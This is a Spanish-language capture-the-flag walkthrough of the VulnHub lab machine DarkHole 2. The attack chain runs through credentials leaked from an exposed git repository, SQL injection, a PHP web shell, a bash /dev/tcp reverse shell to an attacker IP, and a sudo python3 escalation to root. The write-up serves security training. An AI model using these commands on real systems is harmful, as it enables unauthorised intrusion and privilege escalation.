---
title: "DarkHole Write-Up - VulnHub"
description: "DarkHole Write-Up - VulnHub"
pubDatetime: 2023-08-31
tags: ["media", "vulnhub", "git", "sql injection", "internal ports"]
---

# Reconocimiento

Escano rápido de puertos abiertos por TCP.

```bash
❯ sudo nmap -sS --min-rate 5000 -Pn -n -p- --open 192.168.18.98 -oG openPorts
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-20 17:31 CEST
Nmap scan report for 192.168.18.98
Host is up (0.00041s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 74:DF:BF:5B:54:D3 (Liteon Technology)

Nmap done: 1 IP address (1 host up) scanned in 3.20 seconds
```

Escaneo más a fondo para detectar versión y más detalles acerca de los servicios corriendo por los puertos 22 y 80.

```bash
❯ sudo nmap -sCV 192.168.18.98 -oN targeted
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-20 17:34 CEST
Nmap scan report for 192.168.18.98
Host is up (0.00017s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 57:b1:f5:64:28:98:91:51:6d:70:76:6e:a5:52:43:5d (RSA)
|   256 cc:64:fd:7c:d8:5e:48:8a:28:98:91:b9:e4:1e:6d:a8 (ECDSA)
|_  256 9e:77:08:a4:52:9f:33:8d:96:19:ba:75:71:27:bd:60 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-git:
|   192.168.18.98:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: i changed login.php file for more secure
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: DarkHole V2
MAC Address: 74:DF:BF:5B:54:D3 (Liteon Technology)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.74 seconds
```

No tenemos credenciales ssh por lo que pasamos al escaneo del recurso web.

De primeras tenemos un panel de login, pero seguimos sin credenciales.

Vemos que hay un repositorio git expuesto en la ruta `192.168.18.98:80/.git/` le echamos un ojo y nos lo clonamos a nuestro equipo para analizarlo más a fondo.

```bash
❯ wget -r http://192.168.18.98/.git/
```

Una vez con esto clonado, procedemos a revisar el log en busca de cambios interesantes.

```bash
❯ git log
commit 0f1d821f48a9cf662f285457a5ce9af6b9feb2c4 (HEAD -> master)
Author: Jehad Alqurashi <anmar-v7@hotmail.com>
Date:   Mon Aug 30 13:14:32 2021 +0300

    i changed login.php file for more secure

commit a4d900a8d85e8938d3601f3cef113ee293028e10
Author: Jehad Alqurashi <anmar-v7@hotmail.com>
Date:   Mon Aug 30 13:06:20 2021 +0300

    I added login.php file with default credentials

commit aa2a5f3aa15bb402f2b90a07d86af57436d64917
Author: Jehad Alqurashi <anmar-v7@hotmail.com>
Date:   Mon Aug 30 13:02:44 2021 +0300

    First Initialize
    ~~~

Vemos que en el `commit a4d900a8d85e8938d3601f3cef113ee293028e10` dice que añade el login.php con credenciales por defecto. Vamos a ver de que se trata.

~~~bash
❯ git show a4d900a8d85e8938d3601f3cef113ee293028e10
commit a4d900a8d85e8938d3601f3cef113ee293028e10
Author: Jehad Alqurashi <anmar-v7@hotmail.com>
Date:   Mon Aug 30 13:06:20 2021 +0300

    I added login.php file with default credentials

diff --git a/login.php b/login.php
index e69de29..8a0ff67 100644
--- a/login.php
+++ b/login.php
@@ -0,0 +1,42 @@
+<?php
+session_start();
+require 'config/config.php';
+if($_SERVER['REQUEST_METHOD'] == 'POST'){
+    if($_POST['email'] == "lush@admin.com" && $_POST['password'] == "321"){
+        $_SESSION['userid'] = 1;
...
```

Vemos un correo y una contraseña, intentamos usar esta información en el panel de login anterior.

El logueo nos lleva a un `dashboard.php` donde se hace uso de parámetro `id` que, jugando un poco, nos damos cuenta que es vulnerable a inyección SQL, así que interceptamos la request con Burp.

# Inyección SQL e intrusión

Jugando con queries `ORDER BY` descubrimos que la query tiene 6 columnas. Esto hay que tenerlo en cuenta porque al jugar con `UNION SELECT` el número de columnas debe ser el mismo.

Confirmamos que es vulnerable y que muestra el resultado en la página web.

> Importante: Al hacer la query es necesario proporcionar un id no válido ya que sino, las columnas que se muestran estarán ocupadas con los datos correspondientes a ese id y no a lo que nos interesa.

Con `database()` enumeramos el nombre de la base de datos en la que nos encontramos.

Podemos enumerar mas bases de datos jugando con queries a `informacion_schema.schemata` pero de momento solo parece interesante la actual.

Podemos enumerar tablas con `UNION SELECT table_name from information_schema.tables where table_schema = 'darkhole_2'`. En este caso yo juego con un `group_concat` para mostrar todo de una vez.

Vemos dos tablas: **ssh** y **users**. Enumeramos las dos.

En `table_schema` hay que indica el nombre de la base de datos y en `table_name` el nombre de la tabla a enumerar. En el caso de las columnas hay que jugar con `limit` para mostrar columnas 1 por 1 ya que sino no caben en el output. En este caso solo hay que iterar sobre la primera posición `limit X,1`.

Tras examinar las dos tablas, nos queda una base de datos con tablas y columnas tal que así:

Tenemos credenciales ssh.

Enumeramos también la tabla `users`, pero parece que solo existe el usuario _Jehad Alquarashi_ con el que nos habíamos logueado, por lo que concluimos el reconocimiento de la base de datos.

Nos conectamos mediante ssh con las credenciales anteriormente obtenidas.

```bash
❯ ssh jehad@192.168.18.98
jehad@192.168.18.98's password: fool

...

jehad@darkhole:~$ id
uid=1001(jehad) gid=1001(jehad) groups=1001(jehad)
```

Entramos como el usuario no privilegiado `jehad`.

# Escalada de privilegios

Al realizar un reconocimiento básico en busca de ejecutables o permisos SUID no encontramos nada interesante por lo que pasamos a ver si existen puertos internos ocultados al exterior.

```bash
jehad@darkhole:~$ netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:9999          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 192.168.18.98:22        192.168.18.37:48104     ESTABLISHED
tcp6       0      0 :::80                   :::*                    LISTEN
tcp6       0      0 :::22                   :::*                    LISTEN
```

Los puertos `33060` y el `3306` en principio no nos interesan porque se suelen utilizar para bases de datos. Nos llama la atenciónel `9999`, puerto que mediante nmap no pudimos enumerar. Vamos a enumerarlo.

```bash
jehad@darkhole:~$ ps -faux | grep 9999
losy        1270  0.0  0.0   2608   536 ?        Ss   12:52   0:00      \_ /bin/sh -c  cd /opt/web && php -S localhost:9999
losy        1272  0.0  0.4 193672 19096 ?        S    12:52   0:00          \_ php -S localhost:9999
jehad      42578  0.0  0.0   6300   672 pts/0    S+   16:22   0:00              \_ grep --color=auto 9999
```

Listando los procesos activos y filtrando por el puerto 9999 encontramos que el usuario `losy` está ejecutando un servicio php en el directorio `/opt/web`.

Listando su contenido encontramos el siguiente _index.php_:

```php
<?php
echo "Parameter GET['cmd']";
if(isset($_GET['cmd'])){
echo system($_GET['cmd']);
}
?>
```

Al parecer es una [web shell](https://keepcoding.io/blog/que-es-una-webshell/) así que intentamos realizar una petición.

```bash
jehad@darkhole:~$ curl -X GET http://localhost:9999?cmd=id;echo
Parameter GET['cmd']uid=1002(losy) gid=1002(losy) groups=1002(losy)
uid=1002(losy) gid=1002(losy) groups=1002(losy)
```

Al parecer si que funciona así que, nos ponemos en escucha mediante netcat e intentamos entablar una reverse shell.

```bash
nc -lvnp 443 # Atacante

curl -X GET http://localhost:9999 -G --data-urlencode 'cmd=bash -c "bash -i &> /dev/tcp/192.168.18.37/443 0>&1"' # Víctima
```

Tenemos shell como el usuario `losy`. La primera flag se encuentra en `/home/losy/user.txt`.

```bash
losy@darkhole:~$ whoami
losy
```

Para ejecutar `sudo -l` nos pide contraseña, cosa que no tenemos. Enumerando un poco, llegamos al `.bash_history` donde revisando un poco encontramos lo siguiente:

```txt
losy@darkhole:~$ cat .bash_history
P0assw0rd losy:gang

...

password:gang
```

Credenciales en texto claro...

```bash
losy@darkhole:~$ sudo -l
Matching Defaults entries for losy on darkhole:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User losy may run the following commands on darkhole:
    (root) /usr/bin/python3
```

Podemos ejecutar `python3` como el usuario `root`.

```bash
losy@darkhole:~$ sudo /usr/bin/python3
Python 3.8.10 (default, Jun  2 2021, 10:49:15)
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.system("bash")

root@darkhole:/home/losy# whoami
root
```

La flag se encuentra en `/root/root.txt`.

Y hasta aquí la máquina DarhHole2, en un principio tageada como `Hard` pero que no presenta mucha dificultad realmente.
